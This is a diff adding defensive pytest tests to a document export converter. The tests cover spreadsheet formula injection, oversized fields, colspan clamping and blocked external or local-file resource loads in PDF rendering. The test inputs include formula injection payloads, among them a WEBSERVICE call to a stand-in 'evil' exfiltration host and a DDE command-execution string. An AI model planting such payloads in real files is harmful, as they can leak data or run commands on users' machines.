@@ -1,4 +1,5 @@
 import pytest
+from pydantic import ValidationError
 
 from export.converter import ExportRequest, convert_export
 from export.docx_converter import convert_docx
@@ -69,6 +70,50 @@ def test_xlsx_empty_document_returns_workbook() -> None:
     workbook = load_workbook(BytesIO(convert_xlsx("<p>nur text</p>")))
     assert workbook.sheetnames == ["Text"]
     assert workbook["Text"].cell(row=1, column=1).value == "nur text"
+
+
+@pytest.mark.unit
+def test_xlsx_neutralizes_formula_injection() -> None:
+    from io import BytesIO
+
+    from openpyxl import load_workbook
+
+    html = (
+        '<p>=WEBSERVICE("http://evil/exfil")</p>'
+        "<table><tr>"
+        '<td>=HYPERLINK("http://evil","x")</td>'
+        "<td>=CMD|' /C calc'!A0</td>"
+        "<td>+1+1</td>"
+        "<td>-2+3</td>"
+        "<td>@sum(A1:A2)</td>"
+        "<td>normal</td>"
+        "</tr></table>"
+    )
+    workbook = load_workbook(BytesIO(convert_xlsx(html)))
+    assert (
+        workbook["Tabelle 1"].cell(row=1, column=1).value
+        == '\'=HYPERLINK("http://evil","x")'
+    )
+    for sheet in (workbook["Text"], workbook["Tabelle 1"]):
+        for row in sheet.iter_rows():
+            for cell in row:
+                if cell.value:
+                    assert cell.data_type == "s"
+                    assert not str(cell.value).startswith(("=", "+", "-", "@"))
+
+
+@pytest.mark.unit
+def test_export_request_rejects_oversized_fields() -> None:
+    for field in ("markdown", "html", "doc_json"):
+        request = {
+            "markdown": "m",
+            "html": "h",
+            "doc_json": "{}",
+            "target": "pdf",
+            field: "x" * 2_000_001,
+        }
+        with pytest.raises(ValidationError):
+            ExportRequest(**request)
 
 
 @pytest.mark.unit
@@ -198,12 +243,88 @@ def test_docx_table_colspan_merges_cells() -> None:
     assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc
 
 
+@pytest.mark.unit
+def test_docx_huge_colspan_is_clamped() -> None:
+    document = _load_docx(
+        convert_docx('<table><tr><td colspan="1000">x</td></tr></table>')
+    )
+    (table,) = document.tables
+    assert len(table.columns) <= 32
+    assert table.rows[0].cells[0].text == "x"
+
+
+@pytest.mark.unit
+def test_docx_total_merge_budget_is_bounded() -> None:
+    import time
+
+    row = "<tr>" + '<td colspan="64">x</td>' * 4 + "</tr>"
+    html = "<table>" + row * 100 + "</table>"
+
+    start = time.monotonic()
+    document = _load_docx(convert_docx(html))
+    assert time.monotonic() - start < 10
+
+    (table,) = document.tables
+    # early rows spend the merge budget; once it is exhausted every
+    # further cell is rendered unmerged with span 1
+    assert table.rows[0].cells[0]._tc is table.rows[0].cells[1]._tc
+    assert table.rows[-1].cells[0]._tc is not table.rows[-1].cells[1]._tc
+
+
+@pytest.mark.unit
+def test_docx_invalid_colspan_converts_without_exception() -> None:
+    for colspan in ("abc", "0", "-5", ""):
+        html = f'<table><tr><td colspan="{colspan}">x</td></tr></table>'
+        document = _load_docx(convert_docx(html))
+        assert document.tables[0].rows[0].cells[0].text == "x"
+
+
 def _weasyprint_available() -> bool:
     try:
         import weasyprint  # noqa: F401
     except Exception:
         return False
     return True
+
+
+@pytest.mark.unit
+@pytest.mark.skipif(
+    not _weasyprint_available(), reason="weasyprint system libs not available"
+)
+def test_pdf_url_fetcher_allows_only_data_uris() -> None:
+    from export.pdf_converter import _url_fetcher
+
+    _url_fetcher.fetch("data:text/plain,hello")
+    for url in (
+        "http://127.0.0.1:1/x.png",
+        "https://example.com/x.css",
+        "file:///tmp/leak.css",
+    ):
+        with pytest.raises(ValueError):
+            _url_fetcher.fetch(url)
+
+
+@pytest.mark.integration
+@pytest.mark.skipif(
+    not _weasyprint_available(), reason="weasyprint system libs not available"
+)
+def test_pdf_conversion_ignores_external_resources(tmp_path) -> None:
+    from weasyprint import HTML
+
+    from export.pdf_converter import _url_fetcher, convert_pdf
+
+    leak_css = tmp_path / "leak.css"
+    leak_css.write_text("@page { size: 100mm 200mm }")
+    html = (
+        f'<link rel="stylesheet" href="file://{leak_css}">'
+        '<p>text</p><img src="http://127.0.0.1:1/x.png">'
+    )
+
+    data = convert_pdf(html)
+    assert data[:5] == b"%PDF-"
+
+    page = HTML(string=html, url_fetcher=_url_fetcher).render().pages[0]
+    assert page.height > 1000
 
 
 @pytest.mark.integration
